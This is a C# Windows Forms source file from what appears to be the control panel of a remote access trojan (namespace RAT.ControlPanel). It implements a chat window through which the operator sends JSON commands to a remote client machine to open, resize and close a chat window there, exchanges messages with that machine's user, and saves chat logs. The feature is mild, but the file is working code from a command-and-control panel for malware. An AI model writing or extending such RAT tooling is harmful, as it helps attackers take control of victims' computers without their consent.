using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmChat : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        private bool isInitialized = false;
        
        public frmChat(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Chat - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private async void frmChat_Load(object sender, EventArgs e)
        {
            // 채팅 초기화
            await SendCommand(new { type = "chat_init" });
        }
        
        // ===== Send Message =====
        
        private async void btnSend_Click(object sender, EventArgs e)
        {
            await SendMessage();
        }
        
        private async void txtMessage_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter && !e.Shift)
            {
                e.SuppressKeyPress = true;
                await SendMessage();
            }
        }
        
        private async Task SendMessage()
        {
            string message = txtMessage.Text.Trim();
            
            if (string.IsNullOrEmpty(message))
                return;
            
            if (!isInitialized)
            {
                MessageBox.Show("Chat not initialized yet", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            // 메시지 전송
            await SendCommand(new { type = "chat_message", user = "Admin", message = message });
            
            // 로컬에 표시
            AppendMessage("Admin", message, Color.Blue);
            
            txtMessage.Clear();
            txtMessage.Focus();
        }
        
        // ===== Window Control =====
        
        private async void btnMaximize_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "chat_maximize" });
        }
        
        private async void btnMinimize_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "chat_minimize" });
        }
        
        private async void btnNormal_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "chat_normal" });
        }
        
        private async void btnClose_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Close chat window on client?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                await SendCommand(new { type = "chat_close" });
            }
        }
        
        // ===== Clear Chat =====
        
        private void btnClearChat_Click(object sender, EventArgs e)
        {
            richTextBox1.Clear();
        }
        
        // ===== Save Chat =====
        
        private void btnSaveChat_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(richTextBox1.Text))
            {
                MessageBox.Show("No chat to save", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Text File|*.txt|RTF File|*.rtf|All Files|*.*";
            sfd.FileName = $"chat_{client.ClientId}_{DateTime.Now:yyyyMMdd_HHmmss}";
            
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                if (sfd.FileName.EndsWith(".rtf"))
                {
                    richTextBox1.SaveFile(sfd.FileName);
                }
                else
                {
                    System.IO.File.WriteAllText(sfd.FileName, richTextBox1.Text);
                }
                
                MessageBox.Show("Chat saved successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        
        // ===== Append Message =====
        
        private void AppendMessage(string user, string message, Color color)
        {
            if (richTextBox1.InvokeRequired)
            {
                richTextBox1.Invoke(new Action(() => AppendMessage(user, message, color)));
                return;
            }
            
            richTextBox1.SelectionStart = richTextBox1.TextLength;
            richTextBox1.SelectionLength = 0;
            
            richTextBox1.SelectionColor = Color.Gray;
            richTextBox1.AppendText($"[{DateTime.Now:HH:mm:ss}] ");
            
            richTextBox1.SelectionColor = color;
            richTextBox1.SelectionFont = new Font(richTextBox1.Font, FontStyle.Bold);
            richTextBox1.AppendText($"{user}: ");
            
            richTextBox1.SelectionColor = Color.Black;
            richTextBox1.SelectionFont = new Font(richTextBox1.Font, FontStyle.Regular);
            richTextBox1.AppendText($"{message}\n");
            
            richTextBox1.ScrollToCaret();
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            if (type == "chat_init")
            {
                isInitialized = true;
                lblStatus.Text = "Chat initialized";
                AppendMessage("System", "Chat window opened on client", Color.Green);
            }
            else if (type == "chat_message")
            {
                string user = response.user.ToString();
                string message = response.message.ToString();
                
                if (user != "Admin")
                {
                    AppendMessage(user, message, Color.Red);
                }
            }
            else if (type == "chat_close")
            {
                AppendMessage("System", "Chat window closed on client", Color.Orange);
                isInitialized = false;
            }
        }
        
        private void frmChat_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isInitialized)
            {
                _ = SendCommand(new { type = "chat_close" });
            }
        }
    }
}
